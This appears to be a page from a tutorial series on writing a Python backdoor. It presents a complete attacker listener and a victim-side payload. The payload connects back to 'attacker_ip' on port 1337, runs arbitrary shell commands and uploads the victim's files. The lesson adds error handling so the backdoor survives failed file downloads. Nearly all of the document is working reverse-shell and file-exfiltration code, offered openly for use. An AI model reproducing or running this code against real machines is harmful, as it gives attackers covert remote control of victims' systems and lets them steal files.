<h2 align="center">Handle Download Exceptions</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

If you download a non-existing file, it would throw an error message and the backdoor will be terminated.

To handle the file not found exception rather than crashing and exiting the backddor 

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
	cmd = input("enter a command: ")
	
	if cmd == "quit":
		connection.send(b"quit")
		connection.close()
		break

	elif cmd[:2] == "cd":
		connection.send(bytes(cmd, "utf-8"))
		recv = recv_data()
		print(recv.decode("utf-8"))
		continue

	elif cmd[:8] == "download":
		connection.send(bytes(cmd, "utf-8"))

		file_output = recv_data()
		# If does not contain any data information
		if file_output == b"No file found":
			# Decode the message through server side in terms of byte
			print(file_output.decode("utf-8"))
			continue # Continue rather than terminating

		with open(f'{cmd[9:]}', 'wb') as write_data:
			write_data.write(file_output)
			write_data.close()
		continue 
		
	connection.send(bytes(cmd, "utf-8"))
	
	output = recv_data()
	print(output.decode("utf-8"))

print("Server has stopped")
```

> [payload.py](payload.py)
```python
import socket
import subprocess

import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	cmd = payload.recv(2048)
	cmd = cmd.decode("utf-8")
	
	if cmd == "quit":
		payload.close()
		break
	
	elif cmd[:2] == "cd":
		try:
			os.chdir(cmd[3:]) # cd Desktop -: Desktop
		except FileNotFoundError:
			send_data(b"File not found")
		else:
			send_data(b"Changed directory")
		continue

	# download message.txt
	elif cmd[:8] == "download":
		# Handle the exception with try/except block
		try:
			# Content to be inside the try block
			with open(f'{cmd[9:]}', 'rb') as data:
				data_read = data.read()
				data.close()
		# The error that will be caught whenever the file downloaded does not exist
		except FileNotFoundError:
			send_data(b"No file found") # Message will be sent in bytes to the server side
		else: # If no exception then call the data
			send_data(data_read)
		continue

	try:
		output = subprocess.check_output(cmd, shell = True)
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")
	else:
		send_data(output)

print("Disconnected") # display disconnection message
```